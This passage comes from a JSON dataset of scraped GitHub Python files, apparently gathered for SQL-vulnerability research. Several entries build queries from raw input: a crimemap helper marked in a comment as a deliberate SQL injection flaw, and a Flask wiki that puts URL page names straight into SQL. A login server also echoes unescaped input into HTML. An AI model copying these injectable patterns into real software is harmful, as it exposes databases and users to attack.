\", %s %s\"\n\n        #map the type of those objects to the correct postgres type\n        nameList = []\n        nameList.append(tableName)\n        for key in tableObj:\n            try:\n                t = self.__getType(tableObj[key])\n                nameList.append(key)\n                nameList.append(t)\n            except TypeError as e:\n                print('Error with object %s at key %s with value %s'.format(tableObj, key, tableObj[key]))\n                print(\"Caught error %s\".format(e))\n                raise e\n\n        cursor = self.connection.cursor()\n\n        try:\n            cursor.execute(\"CREATE TABLE %s (TIMESTAMP TIMESTAMPTZ NOT NULL\" + cols + \")\", nameList)\n        except psycopg2.Error as e:\n            print(\"CREATE TABLE Error: %s\".format(e))\n\n        self.connection.commit()\n\n    \"\"\"\n    Checks if a table exists\n    takes:\n    tableName - name of the table\n    \"\"\"\n    def tableExists(self, tableName):\n        cursor = self.connection.cursor()\n        try:\n            cursor.execute(\"SELECT EXISTS (SELECT 1 FROM information_schema.tables WHERE table_name = %s)\",tableName)\n        except psycopg2.Error as e:\n            return False\n\n        return True\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/rwolf527/crimemap/blob/192d673c5327de3e9779cd5f25f449e2d202073d",
        "file_path": "/dbhelper.py",
        "source": "import pymysql\nimport dbconfig\n\nclass DBHelper:\n\n    def connect(self, database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                               user=dbconfig.db_user,\n                               passwd=dbconfig.db_password,\n                               db=database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            # The following introduces a deliberate security flaw - SQL Injection\n            query = \"INSERT INTO crimes (description) VALUES ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Gerold103/volgograd/blob/71513b0faa91a738eda5aaecefc47441172550b1",
        "file_path": "/www/query.py",
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport calendar\nfrom datetime import date as libdate\n\nimport tornado\nimport tornado.gen\n\nboiler_room_report_cols = [\n\t'T1', 'T2', 'gas_pressure',\n\t'boilers_all', 'boilers_in_use', 'torchs_in_use', 'boilers_reserve',\n\t'boilers_in_repair',\n\t'net_pumps_in_work', 'net_pumps_reserve', 'net_pumps_in_repair',\n\t'all_day_expected_temp1', 'all_day_expected_temp2',\n\t'all_day_real_temp1', 'all_day_real_temp2',\n\t'all_night_expected_temp1', 'all_night_expected_temp2',\n\t'all_night_real_temp1', 'all_night_real_temp2',\n\t'net_pressure1', 'net_pressure2',\n\t'net_water_consum_expected_ph', 'net_water_consum_real_ph',\n\t'make_up_water_consum_expected_ph', 'make_up_water_consum_real_ph',\n\t'make_up_water_consum_real_pd', 'make_up_water_consum_real_pm',\n\t'hardness', 'transparency'\n]\n\n##\n# {\n# \tboiler_id: {\n# \t\tparameter: {\n# \t\t\tday1: val1,\n# \t\t\tday2: val2,\n# \t\t\t...\n# \t\t},\n# \t\t...\n# \t},\n# \t...\n# }\n#\n@tornado.gen.coroutine\ndef get_boilers_month_values(tx, year, month, columns):\n\tsql = 'SELECT boiler_room_id, DAY(date), {} FROM boiler_room_reports JOIN reports'\\\n\t      ' ON(report_id = reports.id) WHERE '\\\n\t      'YEAR(date) = %s AND MONTH(date) = %s'.format(\",\".join(columns))\n\tparams = (year, month)\n\tcursor = yield tx.execute(query=sql, params=params)\n\tboilers = {}\n\trow = cursor.fetchone()\n\twhile row:\n\t\tboiler_id = row[0]\n\t\tday = row[1]\n\t\tparameters = {}\n\t\tif boiler_id in boilers:\n\t\t\tparameters = boilers[boiler_id]\n\t\telse:\n\t\t\tboilers[boiler_id] = parameters\n\t\tfor i in range(2, len(columns) + 2):\n\t\t\tval = row[i]\n\t\t\tcol = columns[i - 2]\n\t\t\tvalues = {}\n\t\t\tif col in parameters:\n\t\t\t\tvalues = parameters[col]\n\t\t\telse:\n\t\t\t\tparameters[col] = values\n\t\t\tvalues[day] = val\n\t\trow = cursor.fetchone()\n\treturn boilers\n\n##\n# Returns the array with values:\n# { 'title': title_of_a_district, 'rooms':\n#   [\n#     {'id': boiler_id, 'name': boiler_name},\n#     ...\n#   ]\n# }\n#\n@tornado.gen.coroutine\ndef get_districts_with_boilers(tx):\n\tsql = \"SELECT districts.name, boiler_rooms.id, boiler_rooms.name FROM \"\\\n\t      \"districts JOIN boiler_rooms \"\\\n\t      \"ON (districts.id = boiler_rooms.district_id)\"\n\tcursor = yield tx.execute(sql)\n\trow = cursor.fetchone()\n\tdistricts = {}\n\twhile row:\n\t\tdistrict = row[0]\n\t\tid = row[1]\n\t\tname = row[2]\n\t\tboilers = []\n\t\tif district in districts:\n\t\t\tboilers = districts[district]\n\t\telse:\n\t\t\tdistricts[district] = boilers\n\t\tboilers.append({ 'id': id, 'name': name })\n\t\trow = cursor.fetchone()\n\tresult = []\n\tfor district, boilers in sorted(districts.items(), key=lambda x: x[0]):\n\t\tresult.append({ 'title': district, 'rooms': boilers })\n\treturn result\n\n##\n# Get a report for the specified date.\n# @param tx   Current transaction.\n# @param date Date on which need to find a report.\n# @param cols String with columns separated by commas: 'id, name, ...'.\n#\n# @retval Tuple with specified columns or the empty tuple.\n#\n@tornado.gen.coroutine\ndef get_report_by_date(tx, date, cols):\n\tsql = \"SELECT {} FROM reports WHERE date = \"\\\n\t      \"STR_TO_DATE(%s, %s)\".format(cols)\n\tparams = (date, '%d.%m.%Y')\n\tcursor = yield tx.execute(query=sql, params=params)\n\treturn cursor.fetchone()\n\n##\n# Get report days and months by the given year.\n# @param tx   Current transaction.\n# @param year Year which need to find.\n#\n@tornado.gen.coroutine\ndef get_report_dates_by_year(tx, year):\n\tsql = \"SELECT month(date) as month, day(date) as day \"\\\n\t      \"FROM reports WHERE year(date) = %s\"\n\tparams = (year, )\n\tcursor = yield tx.execute(query=sql, params=params)\n\treturn cursor.fetchall()\n\n##\n# Get identifiers and titles of all boiler rooms.\n#\n@tornado.gen.coroutine\ndef get_boiler_room_ids_and_titles(tx):\n\tsql = \"SELECT boiler_rooms.id, boiler_rooms.name, districts.name \"\\\n\t      \"from boiler_rooms JOIN districts ON(districts.id = district_id)\";\n\tcursor = yield tx.execute(query=sql)\n\ttuples = cursor.fetchall()\n\tres = []\n\tfor t in tuples:\n\t\tres.append({'id': t[0], 'title': \"%s - %s\" % (t[2], t[1])})\n\treturn res\n\n##\n# Get parameters of the specified boiler room alog the year.\n# @param tx      Current transaction.\n# @param id      Identifier of the boiler room.\n# @param year    Year along which need to gather parameters.\n# @param columns List of the table columns needed to fetch.\n#\n# @retval Dictionary of the following format:\n#         ...\n#         day_number: {\n#         \tparameter1_of_this_day: [val1, val2, ..., val_days_count],\n#         \t....\n#         \tparameterN_of_this_day: [val1, val2, ..., val_days_count],\n#         },\n#         ...\n#\n@tornado.gen.coroutine\ndef get_boiler_year_report(tx, id, year, columns):\n\tsql = \"SELECT date, {} FROM reports JOIN boiler_room_reports \"\\\n\t      \"ON(reports.id = report_id) WHERE YEAR(date) = %s AND \"\\\n\t      \"boiler_room_id = %s\"\\\n\t      .format(\",\".join(columns))\n\tparams = (year, id)\n\tcursor = yield tx.execute(query=sql, params=params)\n\tdata = cursor.fetchall()\n\tres = {}\n\tfor row in data:\n\t\tparams = {}\n\t\tdate = row[0]\n\t\tday = date.timetuple().tm_yday\n\t\ti = 1\n\t\tfor col in columns:\n\t\t\tparams[col] = row[i]\n\t\t\ti += 1\n\t\tres[day] = params\n\treturn res\n\n##\n# Get air temperature of all days in the specified year.\n# @param year Year in which need to get air temperatures.\n# @retval Dictionary with keys as day numbers and values as\n#         temperatures.\n#\n@tornado.gen.coroutine\ndef get_year_temperature(tx, year):\n\tsql = \"SELECT date, temp_average_air FROM reports WHERE YEAR(date) = %s\"\n\tparams = (year, )\n\tcursor = yield tx.execute(query=sql, params=params)\n\tdata = cursor.fetchall()\n\tres = {}\n\tfor row in data:\n\t\tday = row[0].timetuple().tm_yday\n\t\tres[day] = row[1]\n\treturn res\n\n##\n# Delete report by the specified date.\n#\n@tornado.gen.coroutine\ndef delete_report_by_date(tx, date):\n\tsql = \"DELETE FROM reports WHERE date = %s\"\n\tparams = (date, )\n\tcursor = yield tx.execute(query=sql, params=params)\n\treturn cursor.fetchone()\n\n##\n# Get a district by the name.\n# @param name District name.\n# @param cols String with columns separated by commas: 'id, name', for example.\n#\n# @retval Tuple with found distict or the empty tuple.\n#\n@tornado.gen.coroutine\ndef get_district_by_name(tx, name, cols):\n\tsql = \"SELECT {} FROM districts WHERE name = %s\".format(cols)\n\tparams = (name, )\n\tcursor = yield tx.execute(query=sql, params=params)\n\treturn cursor.fetchone()\n\n##\n# Insert the new district to the districts table.\n#\n@tornado.gen.coroutine\ndef insert_district(tx, name):\n\tsql = \"INSERT INTO districts(name) VALUES (%s)\"\n\tparams = (name, )\n\tyield tx.execute(query=sql, params=params)\n\n##\n# Get a boiler room by the specified district identifier and the boiler room\n# name.\n# @param tx      Current transaction.\n# @param cols    String with columns separated by commas: 'id, name, ...'.\n# @param dist_id Identifier of the district - 'id' from 'districts' table.\n# @param name    Name of the boiler room.\n#\n# @retval Tuple with specified columns or the empty tuple.\n#\n@tornado.gen.coroutine\ndef get_boiler_room_by_dist_and_name(tx, cols, dist_id, name):\n\tsql = \"SELECT {} FROM boiler_rooms WHERE district_id = %s AND \"\\\n\t      \"name = %s\".format(cols)\n\tparams = (dist_id, name)\n\tcursor = yield tx.execute(query=sql, params=params)\n\treturn cursor.fetchone()\n\n##\n# Insert the new boiler room to the boiler rooms table.\n# @param tx      Current transaction.\n# @param dist_id Identifier of the district - 'id' from 'districts' table.\n# @param name    Name of the new boiler room.\n#\n@tornado.gen.coroutine\ndef insert_boiler_room(tx, dist_id, name):\n\tsql = \"INSERT INTO boiler_rooms(district_id, name) \"\\\n\t      \"VALUES (%s, %s)\"\n\tparams = (dist_id, name)\n\tyield tx.execute(query=sql, params=params)\n\n##\n# Get a value from iterable object by name, or None, if the object doesn't\n# contain the name.\n#\ndef get_safe_val(src, name):\n\tif not name in src:\n\t\treturn None\n\treturn src[name]\n\n##\n# Get a string representing the specified date.\n#\ndef get_str_date(year, month, day):\n\treturn libdate(year=year, month=month, day=day).strftime('%Y-%m-%d')\n\n##\n# Convert not existing and None values to '-' for html output.\n#\ndef get_html_val(src, name):\n\tif not name in src or src[name] is None:\n\t\treturn '-'\n\treturn src[name]\n\n##\n# Get string representation of a float value useful for output to\n# an user on a web page.\n#\ndef get_html_float_to_str(src, name, precision=2):\n\ttry:\n\t\treturn ('{:.' + str(precision) + 'f}').format(float(src[name]))\n\texcept:\n\t\treturn '-'\n\n##\n# Insert the new report about the specified boiler room.\n# @param tx        Current transaction.\n# @param src       Dictionary with the boiler room attributes.\n# @param room_id   Identifier of the boiler room - 'id' from\n#                  'boiler_rooms' table.\n# @param report_id Identifier of the report - 'id' from 'reports' table.\n#\n@tornado.gen.coroutine\ndef insert_boiler_room_report(tx, src, room_id, report_id):\n\tsql = 'INSERT INTO boiler_room_reports '\\\n\t      'VALUES (NULL, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, '\\\n\t\t       '%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, '\\\n\t\t       '%s, %s, %s, %s, %s, %s)'\n\tassert(room_id)\n\tassert(report_id)\n\tglobal boiler_room_report_cols\n\tparams = [room_id, report_id]\n\tfor col in boiler_room_report_cols:\n\t\tparams.append(get_safe_val(src, col))\n\tyield tx.execute(query=sql, params=params)\n\n##\n# Insert a report to the reports table. If some columns absense then replace\n# them with NULL values.\n#\n@tornado.gen.coroutine\ndef insert_report(tx, src):\n\tsql = 'INSERT INTO reports VALUES (NULL, STR_TO_DATE(%s, %s), %s, %s, '\\\n\t      '%s, %s, %s, STR_TO_DATE(%s, %s), %s, %s, %s, %s, %s, %s, %s)'\n\tparams = (get_safe_val(src, 'date'),\n\t\t  '%d.%m.%Y',\n\t\t  get_safe_val(src, 'temp_average_air'),\n\t\t  get_safe_val(src, 'temp_average_water'),\n\t\t  get_safe_val(src, 'expected_temp_air_day'),\n\t\t  get_safe_val(src, 'expected_temp_air_night'),\n\t\t  get_safe_val(src, 'expected_temp_air_all_day'),\n\t\t  get_safe_val(src, 'forecast_date'),\n\t\t  '%d.%m.%Y',\n\t\t  get_safe_val(src, 'forecast_weather'),\n\t\t  get_safe_val(src, 'forecast_direction'),\n\t\t  get_safe_val(src, 'forecast_speed'),\n\t\t  get_safe_val(src, 'forecast_temp_day_from'),\n\t\t  get_safe_val(src, 'forecast_temp_day_to'),\n\t\t  get_safe_val(src, 'forecast_temp_night_from'),\n\t\t  get_safe_val(src, 'forecast_temp_night_to'))\n\tyield tx.execute(query=sql, params=params)\n\n##\n# Get all boiler room reports by the specified date, joined with corresponding\n# district and boiler room names.\n# @param tx   Current transaction.\n# @param date Date by which need to find all reports.\n#\n# @retval Array of tuples.\n#\n@tornado.gen.coroutine\ndef get_full_report_by_date(tx, date):\n\tsql = 'SELECT * FROM reports WHERE date = STR_TO_DATE(%s, %s)'\n\tparams = (date, '%Y-%m-%d')\n\tcursor = yield tx.execute(query=sql, params=params)\n\treport = cursor.fetchone()\n\tif not report:\n\t\treturn None\n\trep_id = report[0]\n\tsql = 'SELECT districts.name, boiler_rooms.name, {} '\\\n\t      'FROM districts JOIN boiler_rooms '\\\n\t      'ON(districts.id = boiler_rooms.district_id) '\\\n\t      'JOIN boiler_room_reports '\\\n\t      'ON (boiler_room_reports.boiler_room_id = '\\\n\t\t  'boiler_rooms.id AND boiler_room_reports.report_id = {})'\\\n\t      .format(\",\".join(boiler_room_report_cols), rep_id)\n\tcursor = yield tx.execute(sql)\n\t#\n\t# First, create a dictionary of the following format:\n\t#\n\t# {\n\t#     'district1': [room1, room2, ...],\n\t#     'district2': [room3, room4, ...],\n\t#     ....\n\t# }\n\tdistricts = {}\n\tnext_row = cursor.fetchone()\n\twhile next_row:\n\t\tdist_name = next_row[0]\n\t\t#\n\t\t# If it is first room for this district, then create a list\n\t\t# for it. Else - use existing.\n\t\t#\n\t\tif dist_name not in districts:\n\t\t\tdistricts[dist_name] = []\n\t\trooms = districts[dist_name]\n\t\tnext_report = {'name': next_row[1]}\n\t\ti = 2\n\t\tfor col in boiler_room_report_cols:\n\t\t\tnext_report[col] = next_row[i]\n\t\t\ti += 1\n\t\trooms.append(next_report)\n\t\tnext_row = cursor.fetchone()\n\tresult = {}\n\tresult['date'] = report[1]\n\tresult['temp_average_air'] = report[2]\n\tresult['temp_average_water'] = report[3]\n\tresult['expected_temp_air_day'] = report[4]\n\tresult['expected_temp_air_night'] = report[5]\n\tresult['expected_temp_air_all_day'] = report[6]\n\tresult['forecast_date'] = report[7]\n\tresult['forecast_weather'] = report[8]\n\tresult['forecast_direction'] = report[9]\n\tresult['forecast_speed'] = report[10]\n\tresult['forecast_temp_day_from'] = report[11]\n\tresult['forecast_temp_day_to'] = report[12]\n\tresult['forecast_temp_night_from'] = report[13]\n\tresult['forecast_temp_night_to'] = report[14]\n\tresult['districts'] = []\n\tfor dist, rooms in sorted(districts.items(), key=lambda x: x[0]):\n\t\tdistrict = {'name': dist}\n\t\trooms[0]['district'] = dist\n\t\tfor i in range(1, len(rooms)):\n\t\t\trooms[i]['district'] = None\n\t\tdistrict['rooms'] = rooms\n\t\tresult['districts'].append(district)\n\treturn result\n\n##\n# Get average values of all parameters for the specified month\n# in all boiler rooms.\n#\n@tornado.gen.coroutine\ndef get_sum_reports_by_month(tx, year, month, cols):\n\tavg_list = list(['SUM({})'.format(col) for col in cols])\n\tsql = 'SELECT DAY(date), {} FROM reports JOIN boiler_room_reports '\\\n\t      'ON(reports.id = report_id) WHERE MONTH(date) = %s and '\\\n\t      'YEAR(date) = %s GROUP BY date;'.format(\",\".join(avg_list))\n\tparams = (month, year)\n\tcursor = yield tx.execute(query=sql, params=params)\n\tdata = cursor.fetchall()\n\tstart_week, month_range = calendar.monthrange(year, month)\n\tres = {}\n\tfor row in data:\n\t\tparams = {}\n\t\tday = row[0]\n\t\ti = 1\n\t\tfor col in cols:\n\t\t\tparams[col] = row[i]\n\t\t\ti += 1\n\t\tres[day] = params\n\treturn res\n\n##\n# Get a user by the specified email.\n# @param tx    Current transaction.\n# @param cols  String with columns separated by commas: 'id, name, ...'.\n# @param email Email of the user.\n#\n# @retval Tuple with specified columns or the empty tuple.\n#\n@tornado.gen.coroutine\ndef get_user_by_email(tx, cols, email):\n\tsql = \"SELECT {} FROM users WHERE email = %s\".format(cols)\n\tparams = (email)\n\tcursor = yield tx.execute(query=sql, params=params)\n\treturn cursor.fetchone()\n\n##\n# Insert the user to the users table.\n#\n@tornado.gen.coroutine\ndef insert_user(tx, email, pass_hash):\n\tsql = \"INSERT INTO users(email, pass_hash) VALUES (%s, %s)\"\n\tparams = (email, pass_hash)\n\tyield tx.execute(query=sql, params=params)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tovine/TTM4115/blob/1a452f6c1b891d85f2e9fdbcaafa1775160e3e3a",
        "file_path": "/webserver/server.py",
        "source": "import asyncio, base64, bcrypt, time, string\nfrom aiohttp import web\nfrom cryptography import fernet\nfrom aiohttp_session import setup as session_setup, get_session, session_middleware\nfrom aiohttp_session.cookie_storage import EncryptedCookieStorage\nfrom psycopg2 import IntegrityError\nimport database\nimport mazemap\n\nHTML_base = \"\"\"\n<!doctype html>\n<html>\n<title>Toilet Finder</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n\n{text}\n\n</html>\n\"\"\"[1:-1]\n\n#decorators:\ndef handle_html(func):\n\t#handle_html.timeout\n\tasync def ret(*args, **kwargs):\n\t\tsession = await get_session(args[0])\n\t\t\n\t\tif \"uname\" in session and \"ignore_timeout\" not in session:\n\t\t\tt = time.time()\n\t\t\tprev = session[\"visit_time\"]\n\t\t\tif t - prev > handle_html.timeout: del session[\"uname\"]\n\t\t\tsession[\"visit_time\"] = t\n\t\telse:\n\t\t\tsession[\"visit_time\"] = time.time()\n\t\t\n\t\ttext = await func(*args, **kwargs)\n\t\t\n\t\tout = web.Response(\n\t\t\tcontent_type = \"text/html\",\n\t\t\ttext = HTML_base.format(text=text)\n\t\t)\n\t\t\n\t\treturn out\n\treturn ret\ndef using_base(filename):\n\twith open(f\"base/{filename}\", \"r\") as f:\n\t\tbase = f.read()\n\tdef decorator(func):\n\t\tasync def ret(request):\n\t\t\tout = await func(request, base)\n\t\t\treturn out\n\t\treturn ret\n\treturn decorator\ndef require_login(func):\n\tasync def ret(*args, **kwargs):\n\t\tsession = await get_session(args[0])\n\t\tif \"uname\" not in session:\n\t\t\tsession[\"return_after_login\"] = args[0].path_qs\n\t\t\treturn \"You must be <a href=\\\"/login\\\">logged in</a> to access this page.\"\n\t\tout = await func(*args, **kwargs)\n\t\treturn out\n\treturn ret\ndef cache_page(func):#doesn't account for query parameters or different users\n\tcache = [None, 0]\n\t#cache_page.timeout\n\tasync def ret(*args, **kwargs):\n\t\tif time.time() - cache[1] > cache_page.timeout:\n\t\t\tcache[0] = await func(*args, **kwargs)\n\t\t\tcache[1] = time.time()\n\t\treturn cache[0]\n\treturn ret\n\n#index\n@handle_html\n@using_base(\"index.html\")\n@cache_page\nasync def GET_index(request, base):\n\ttext = \"\\n\".join((\n\t\t\"<a href=\\\"/mapmaker\\\">/mapmaker</a><br/>\",\n\t\t\"<a href=\\\"/map\\\">/map</a><br/>\",\n\t\t\"<a href=\\\"/login\\\">/login</a><br/>\",\n\t\t\"<a href=\\\"/settings\\\">/settings</a><br/>\",\n\t\t\"<a href=\\\"/mazetest\\\">/mazetest</a><br/>\",\n\t\t\"<a href=\\\"http://disco.fleo.se/TEAM%2010%20FTW!!!\\\">Team 10 FTW</a>\"\n\t))\n\treturn base.format(text = text)\n\n\n#login and registration\n@handle_html\n@using_base(\"loginform.html\")\nasync def GET_login(request, base):\n\tsession = await get_session(request)\n\t\n\tif \"uname\" not in session:\n\t\treturn base\n\telse:\n\t\treturn \"<b>You're already logged in as <i>%s</i>!</b>\\n<form action='/login' method='post'><input type='submit' name='action' value='logout'/></form>\" % session[\"uname\"]\n\n@handle_html\nasync def POST_login(request):\n\tsession = await get_session(request)\n\tdata = await request.post()\n\t\n\tif set([\"action\", \"uname\", \"psw\"]).issubset(data.keys()) and \"uname\" not in session:\n\t\tuname = data[\"uname\"]\n\t\tpsw = data[\"psw\"]\n\t\t\n\t\tif data[\"action\"] == \"login\":\n\t\t\t\n\t\t\tentry = await database.select_user(request, uname)\n\t\t\tif not entry:\n\t\t\t\treturn \"Error: No such user.\"\n\t\t\t\n\t\t\tif bcrypt.hashpw(psw.encode(\"UTF-8\"), entry[0][2].encode(\"UTF-8\")).decode(\"UTF-8\") != entry[0][2]:\n\t\t\t\treturn \"Error: Wrong password\"\n\t\t\t\n\t\t\tsession[\"uname\"] = uname\n\t\t\tsession[\"login_time\"] = time.time()\n\t\t\t\n\t\t\tif \"keep\" in data and data[\"keep\"] == \"logged_in\":\n\t\t\t\tsession[\"ignore_timeout\"] = True\n\t\t\t\n\t\t\t#success\n\t\t\tout = \"Login successfull!\"\n\t\t\tif \"return_after_login\" in session:\n\t\t\t\tout += f\"<br/>\\n<a href=\\\"{session['return_after_login']}\\\">Go back</a>\"\n\t\t\t\tdel session[\"return_after_login\"]\n\t\t\treturn out\n\t\telif data[\"action\"] == \"register\" and \"psw2\" in data:\n\t\t\tif not is_valid_username(uname):\n\t\t\t\treturn f\"Error: invalid username: <i>{uname}</i><br>\\nWe only allow characters from the english alphabet plus digits\"\n\t\t\t\n\t\t\tif psw != data[\"psw2\"]:\n\t\t\t\treturn \"Error: mismatching passwords!\"\n\t\t\t\n\t\t\tbhash = bcrypt.hashpw(psw.encode(\"UTF-8\"), bcrypt.gensalt()).decode(\"UTF-8\")\n\t\t\t\n\t\t\ttry:\n\t\t\t\tawait database.insert_user(request, uname, bhash)\n\t\t\texcept IntegrityError:\n\t\t\t\treturn \"Error: username already taken!\"\n\t\t\t\n\t\t\treturn \"User created! <a href=\\\"/login\\\">login over here.</a>\"\n\telif \"action\" in data:\n\t\tif data[\"action\"] == \"logout\" and \"uname\" in session:\n\t\t\tfor i in (\"uname\", \"ignore_timeout\"):\n\t\t\t\tif i in session:\n\t\t\t\t\tdel session[i]\n\t\t\treturn \"Logged out\"\n\t\t\t\n\t\t\t\n\t\n\treturn f\"Invalid login POST:<br/><i>{data.items()}</i><br>\\nAlready logged in: {'uname' in session}\"\n\n#maps:\n@handle_html\n@using_base(\"mapmaker.html\")\n@cache_page\nasync def GET_mapmaker(request, base):\n\ttags = await database.select_tags(request)\n\ttag_checkboxes = \"\\n\\t\".join((f\"<input type=\\\"checkbox\\\" name=\\\"tag\\\" value=\\\"{ID}\\\"> {label}<br>\" for ID, label in tags))\n\treturn base.format(tags=tag_checkboxes)\n\n@handle_html\nasync def GET_map(request):\n\t#session = await get_session(request)\n\ttags = []\n\tmode = \"all\"\n\tfor key, i in request.query.items():\n\t\tif key == \"mode\":\n\t\t\tmode = i\n\t\telif key == \"tag\":\n\t\t\ttags.append(i)\n\t\n\tif not tags:\n\t\ttoilets = await database.select_toilet_statuses(request)\n\telse:\n\t\ttoilets = await database.select_toilet_statuses_by_tags(request, tags)\n\t\n\tred, blue = [], []\n\tfor ID, lat, lng, name, status, dt in toilets:\n\t\t(blue if status else red).append((ID, lat, lng, name, None))\n\t\n\tout = \"%s\\n%s\" % (\n\t\tmazemap.make_marker_chubs(red, color = \"red\") if mode == \"all\" else \"\",\n\t\tmazemap.make_marker_chubs(blue, color = \"blue\")\n\t)\n\t\n\treturn mazemap.JS_skeleton.format(code = out)\n\n#menus:\n@handle_html\n@require_login\n@using_base(\"settings.html\")\nasync def GET_settings(request, base):\n\t\n\treturn base\n\n@handle_html\n@require_login\nasync def POST_settings(request):\n\tsession = await get_session(request)\n\tdata = await request.post()\n\tuname = session[\"uname\"]\n\t\n\tif \"action\" in data:\n\t\tif data[\"action\"] == \"change_password\":\n\t\t\tif set([\"cpsw\", \"psw\", \"psw2\"]).issubset(data.keys()):\n\t\t\t\tif data[\"psw\"] != data[\"psw2\"]:\n\t\t\t\t\treturn \"New passwords doesn't match!\"\n\t\t\t\t\n\t\t\t\t#check if current password matches:\n\t\t\t\tentry = await database.select_user(request, uname)\n\t\t\t\tif not entry:\n\t\t\t\t\treturn \"Error: Logged in as non-existing user! (what?)\"\n\t\t\t\tcpsw = data[\"cpsw\"]\n\t\t\t\tif bcrypt.hashpw(cpsw.encode(\"UTF-8\"), entry[0][2].encode(\"UTF-8\")).decode(\"UTF-8\") != entry[0][2]:\n\t\t\t\t\treturn \"Error: \\\"Current password\\\" was incorrect\"\n\t\t\t\t\n\t\t\t\t#set new password\n\t\t\t\tpsw = data[\"psw\"]\n\t\t\t\tbhash = bcrypt.hashpw(psw.encode(\"UTF-8\"), bcrypt.gensalt()).decode(\"UTF-8\")\n\t\t\t\tawait database.update_user_password(request, uname, bhash)\n\t\t\t\t\n\t\t\t\treturn \"Success! Your password has been changed!<br>\\n<a href=\\\"/settings\\\">Click here to go back.</a>\"\n\t\n\t\n\treturn f\"Invalid POST request: <i>{data.items()}</i>\"\n\n\n@handle_html\nasync def GET_test(request):\n\t#session = await get_session(request)\n\tout = await mazemap.test(request)\n\treturn out\n\n#=====================================================================\ndef is_valid_username(uname):\n\tfor i in uname:\n\t\tif i not in string.ascii_letters and i not in string.digits:\n\t\t\treturn False\n\treturn True\n\ndef create_session_secret():\n\tfernet_key = fernet.Fernet.generate_key()\n\treturn base64.urlsafe_b64decode(fernet_key)\n\ndef add_routes(app, secret_key):\n\thandle_html.timeout = app[\"ini\"].getint(\"sessions\", \"session_idle_timeout\")\n\tcache_page.timeout  = app[\"ini\"].getint(\"sessions\", \"cached_page_timeout\")\n\t\n\t#app.router.add_route('POST', '/pv/v1/', handle_v1)\n\tapp.router.add_get('/',      GET_index)\n\tapp.router.add_get('/index', GET_index)\n\t\n\tapp.router.add_get ('/login', GET_login)\n\tapp.router.add_post('/login', POST_login)\n\t\n\tapp.router.add_get ('/settings', GET_settings)\n\tapp.router.add_post('/settings', POST_settings)\n\t\n\tapp.router.add_get('/mapmaker', GET_mapmaker)\n\tapp.router.add_get('/map', GET_map)\n\t\n\tapp.router.add_get('/mazetest', GET_test)\n\t\n\tapp.router.add_static(\n\t\t'/static/',\n\t\tpath='static',\n\t\tname='static'\n\t)\n\t\n\tsession_setup(app, EncryptedCookieStorage(secret_key))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jcortes0309/wiki_flask/blob/d3334f42e6283485337bca27658554fb8a3de349",
        "file_path": "/server.py",
        "source": "from flask import Flask, render_template, request, redirect, Markup\nfrom wiki_linkify import wiki_linkify\nimport pg, markdown\nfrom datetime import datetime\napp = Flask(\"wiki\")\n\ndb = pg.DB(dbname=\"wiki\")\ndb.debug = True\n\n@app.route(\"/\")\ndef home_page():\n    return redirect(\"/homepage\")\n\n@app.route(\"/<page_name>\")\ndef place_holder(page_name):\n    # Query database looking for existing information for the page called by the user\n    query = db.query(\"select * from page where title = '%s'\" % page_name).namedresult()\n    all_pages_query = db.query(\"select title from page order by title;\").namedresult()\n    print \"\\n\\nAll pages query: %r\\n\\n\" % all_pages_query\n    # No information was found in the database for the page\n    if len(query) == 0:\n        return render_template(\n            \"placeholderpage.html\",\n            page_name = page_name,\n            query = query,\n            all_pages_query = all_pages_query\n        )\n    # Information was found in the database for the page\n    else:\n        query = query[0]\n        print query\n        # Query database looking for historical information for the page called by the user\n        query_history = db.query(\"select * from page_history where page_id = '%s' order by version_number DESC;\" % query.id).namedresult()\n        print query_history\n        page_content = query.page_content\n        wiki_linkified_content = wiki_linkify(page_content)\n\n        if len(query_history) > 0:\n            return render_template(\n                \"placeholderpage.html\",\n                page_name = page_name,\n                query = query,\n                page_content = Markup(markdown.markdown(wiki_linkified_content)),\n                query_history = query_history,\n                all_pages_query = all_pages_query\n            )\n        else:\n            return render_template(\n                \"placeholderpage.html\",\n                page_name = page_name,\n                query = query,\n                page_content = Markup(markdown.markdown(wiki_linkified_content)),\n                all_pages_query = all_pages_query\n            )\n\n@app.route(\"/<page_name>/edit\")\ndef edit_page(page_name):\n    query = db.query(\"select * from page where title = '%s'\" % page_name).namedresult()\n    if len(query) == 0:\n        return render_template(\n            \"edit.html\",\n            page_name=page_name,\n            query=query\n        )\n    else:\n        return render_template(\n            \"edit.html\",\n            page_name=page_name,\n            query=query[0]\n        )\n\n@app.route(\"/<page_name>/save\", methods=[\"POST\"])\ndef save_content(page_name):\n    action = request.form.get(\"submit_button\")\n\n    if action == \"update\":\n        query = db.query(\"select * from page where title = '%s'\" % page_name)\n        result_list = query.namedresult()\n        print result_list\n        result_list = result_list[0]\n        print result_list\n        db.insert(\n            \"page_history\",\n            title = page_name,\n            page_content = result_list.page_content,\n            author_name = result_list.author_name,\n            last_mod_date = result_list.last_mod_date,\n            page_id = result_list.id,\n            version_number = result_list.version_number\n        )\n\n    current_time = datetime.now()\n    last_mod_time = current_time.strftime('%Y/%m/%d %H:%M:%S')\n    id = request.form.get(\"id\")\n    page_content = request.form.get(\"page_content\")\n    author_name = request.form.get(\"author_name\")\n    last_mod_date = request.form.get(\"last_mod_date\")\n    version_number = request.form.get(\"version_number\")\n    if action == 